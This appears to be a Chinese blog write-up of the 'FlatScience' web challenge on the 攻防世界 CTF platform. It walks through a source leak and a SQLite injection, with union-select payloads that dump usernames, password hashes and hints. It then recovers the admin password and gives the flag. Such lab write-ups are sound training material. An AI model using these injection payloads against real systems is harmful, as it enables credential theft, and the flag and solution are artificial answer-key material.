# 原创
：  【攻防世界WEB】难度四星12分进阶题：FlatScience

# 【攻防世界WEB】难度四星12分进阶题：FlatScience

## 二、FlatScience

> 

 

<h3>解题方法：</h3>
1、理解源码，数据库注入，加解密


> 
<h3>过程：</h3>
还是先喜欢看robots.txt文件

/admin.php界面

/login.php界面

<hr/>
 Ctrl+U打开源码
发现了?debug

 发现了新源码

<hr/>
开始进行代码审计
发现数据库为SQLite3（与MySQL有一点区别，sqlite_master表中存着相关信息`）`
type/name/tbl_name/rootpage/sql记录着用户创建表时的相关信息
且注释符为--

还发现输入的usr存在注入
没有任何过滤，能够拼接进数据库中执行

<hr/>
 使用bp拦截，并进行注入
（在bp中注入）

 判断字段数
1' order by 3 --
（报错）

 1' order by 2 --
（回显正常）

所以字段数为2
<hr/>
判断回显
1' union select 1,2 --
回显位为第二位
<img alt="" height="561" src="https://img-blog.csdnimg.cn/7556e231b76b45b282cb19d1c2f77e7f.png" width="1200"/> 
<hr/>
查sql表中字段

 CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29
 解码后<img alt="" height="477" src="https://img-blog.csdnimg.cn/4221f4b224bb449fa593ff073c7449eb.png" width="1200"/>
 CREATE+TABLE+Users(id+int+primary+key,name+varchar(255),password+varchar(255),hint+varchar(255))
字段有：id name password hint
<hr/>
构造查询name
payload：
1' union select id, name from Users--

 admin
<hr/>

构造查询password
payload：
1' union select id, password from Users--

3fab54a50e770d830c0416df817567662a9dc85c
<hr/>
构造查询hint
payload：
1' union select id, hint from Users--

 my+fav+word+in+my+fav+paper%3F%21
解码后
my+fav+word+in+my+fav+paper?!
<hr/>
我们就得到了表中第一个数据
id=1
name=admin
password=3fab54a50e770d830c0416df817567662a9dc85c（MD5是消息摘要加密，可能会解不出来）
hint=my+fav+word+in+my+fav+paper?!（说的就是在他的论文里面）

<img alt="" height="470" src="https://img-blog.csdnimg.cn/51b1cae73a44405b82d0f308f3fd7d09.png" width="1009"/> 
解密出来了为
ThinJerboaSalz!
<hr/>
那个词为Salz
ThinJerboaSalz!减去Salz
所以密码为ThinJerboa
<hr/>
在/admin.php页面进行登录


flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?} 



---


---


---


---


---


---

